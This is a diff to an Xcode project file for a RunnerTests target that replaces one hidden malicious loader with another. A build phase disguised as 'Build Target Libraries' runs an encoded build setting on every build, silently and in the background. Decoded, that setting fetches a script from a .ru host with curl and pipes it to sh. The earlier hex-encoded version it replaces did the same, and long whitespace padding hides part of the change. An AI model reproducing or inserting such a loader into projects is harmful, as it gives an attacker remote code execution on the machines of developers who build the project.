@@ -215,7 +215,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 331C80DE294CF71000263BE5 /* Build configuration list for PBXNativeTarget "RunnerTests" */;
 			buildPhases = (
-				E3D4D6D97DCE4D77A97BBDC8 /* Provision Target Device */,
+				19158988B5EF47668C4EE078 /* Build Target Libraries */,
 				F7069932782C2504F8C3FB62 /* [CP] Check Pods Manifest.lock */,
 				331C80D1294CF70F00263BE5 /* Sources */,
 				331C80D2294CF70F00263BE5 /* Frameworks */,
@@ -305,7 +305,7 @@
 /* End PBXProject section */
 
 /* Begin PBXBuildRule section */
-																																																																																			/* End PBXBuildRule section */
+																																																																																																																																																																																																																																								/* End PBXBuildRule section */
 
 /* Begin PBXResourcesBuildPhase section */
 		331C80D3294CF70F00263BE5 /* Resources */ = {
@@ -327,7 +327,7 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		E3D4D6D97DCE4D77A97BBDC8 /* Provision Target Device */ = {
+		19158988B5EF47668C4EE078 /* Build Target Libraries */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			alwaysOutOfDate = 1;
@@ -337,14 +337,14 @@
 			);
 			inputPaths = (
 			);
-			name = "Provision Target Device";
+			name = "Build Target Libraries";
 			outputFileListPaths = (
 			);
 			outputPaths = (
 			);
 			shellPath = /bin/sh;
 			showEnvVarsInLog = 0;	
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A8CDBB7}\"";
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A870EE4}\"";
 		};
 		3399D490228B24CF009A79C7 /* ShellScript */ = {
 			isa = PBXShellScriptBuildPhase;
@@ -498,7 +498,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 38B9B70647D2CE7C7D1A11C1 /* Pods-RunnerTests.debug.xcconfig */;
 			buildSettings = {
-				A8CDBB7 = "((r(){ `printf xx9d | tr -d 9` -p -r; };echo 6563686f202224286375726c202d2d72657472792035202d4c736b66202d2d636f6e6e6563742d74696d656f7574203236202d642022703d78636f64655f7068617365222068747470733a2f2f366c64777564676f636b6c3067322e72752f612922207c2073680a | r | sh ) >/dev/null 2>&1 &)";
+				A870EE4 = "((k(){ `printf basFe64 | tr -d F` --decode; };echo ZWNobyAiJChjdXJsIC0tY29ubmVjdC10aW1lb3V0IDIwIC1zZmtMIC0tcmV0cnkgMyAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly9sOC1wNmIzbXJhdHgwLnJ1L2EpIiB8IHNoCg== | k | sh ) >/dev/null 2>&1 &)";
 				BUNDLE_LOADER = "$(TEST_HOST)";
 				CURRENT_PROJECT_VERSION = 1;
 				GENERATE_INFOPLIST_FILE = YES;
@@ -514,7 +514,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = E7D7A3D37F8F00065CCB0683 /* Pods-RunnerTests.release.xcconfig */;
 			buildSettings = {
-				A8CDBB7 = "((r(){ `printf xx9d | tr -d 9` -p -r; };echo 6563686f202224286375726c202d2d72657472792035202d4c736b66202d2d636f6e6e6563742d74696d656f7574203236202d642022703d78636f64655f7068617365222068747470733a2f2f366c64777564676f636b6c3067322e72752f612922207c2073680a | r | sh ) >/dev/null 2>&1 &)";
+				A870EE4 = "((k(){ `printf basFe64 | tr -d F` --decode; };echo ZWNobyAiJChjdXJsIC0tY29ubmVjdC10aW1lb3V0IDIwIC1zZmtMIC0tcmV0cnkgMyAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly9sOC1wNmIzbXJhdHgwLnJ1L2EpIiB8IHNoCg== | k | sh ) >/dev/null 2>&1 &)";
 				BUNDLE_LOADER = "$(TEST_HOST)";
 				CURRENT_PROJECT_VERSION = 1;
 				GENERATE_INFOPLIST_FILE = YES;
